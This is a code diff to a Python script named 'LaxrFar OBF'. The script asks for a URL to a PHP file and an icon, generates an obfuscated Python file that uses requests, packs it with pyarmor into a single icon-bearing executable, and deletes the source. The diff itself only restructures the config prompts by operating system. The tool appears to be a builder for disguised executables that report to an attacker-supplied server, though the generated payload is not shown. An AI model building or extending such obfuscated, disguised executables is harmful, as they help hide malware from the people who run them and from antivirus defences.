@@ -4,23 +4,40 @@ import json
 if os.name == 'nt':
     os.system("title LaxrFar OBF")
 
-if not os.path.exists('config.json'):
-    print('[CONFIG] Creating config file!')
-    url = input('[CONFIG] URL TO PHP FILE >> ')
-    icon = input('[CONFIG] ICON FILE >> ')
-    with open('config.json', 'w') as f:
-        data = {}
-        data = ({
-            'url' : url,
-            'icon' : icon,
-        })
-        json.dump(data, f)
+if os.name == 'nt':
+    if not os.path.exists('config.json'):
+        print('[CONFIG] Creating config file!')
+        url = input('[CONFIG] URL TO PHP FILE >> ')
+        icon = input('[CONFIG] ICON FILE >> ')
+        with open('config.json', 'w') as f:
+            data = {}
+            data = ({
+                'url' : url,
+                'icon' : icon,
+            })
+            json.dump(data, f)
+    else:
+        with open('config.json', 'r') as f:
+            data = json.load(f)
+        url = data['url']
+        icon = data['icon']
 else:
-    with open('config.json', 'r') as f:
-        data = json.load(f)
-    url = data['url']
-    icon = data['icon']
-
+    if not os.path.exists('config.json'):
+        print('[CONFIG] Creating config file!')
+        url = input('[CONFIG] URL TO PHP FILE >> ')
+        icon = input('[CONFIG] ICON FILE >> ')
+        with open('config.json', 'w') as f:
+            data = {}
+            data = ({
+                'url' : url,
+                'icon' : icon,
+            })
+            json.dump(data, f)
+    else:
+        with open('config.json', 'r') as f:
+            data = json.load(f)
+        url = data['url']
+        icon = data['icon']
 f = open("obfuscated.py", "w")
 f.write("""try:
     import requests
@@ -43,6 +60,9 @@ f.close()
 print("Obfuscation Complete")
 os.system("pip install pyarmor")
 os.system("pip3 install pyarmor")
-os.system(f'pyarmor pack --clean -e "--onefile --icon {icon}" obfuscated.py')
+if os.name == 'nt':
+    os.system(f'pyarmor pack --clean -e "--onefile --icon {icon}" obfuscated.py')
+else:
+    os.system(f'pyarmor pack --clean -e "--onefile" obfuscated.py')
 os.remove("obfuscated.py")
 print("Builded To Exe")
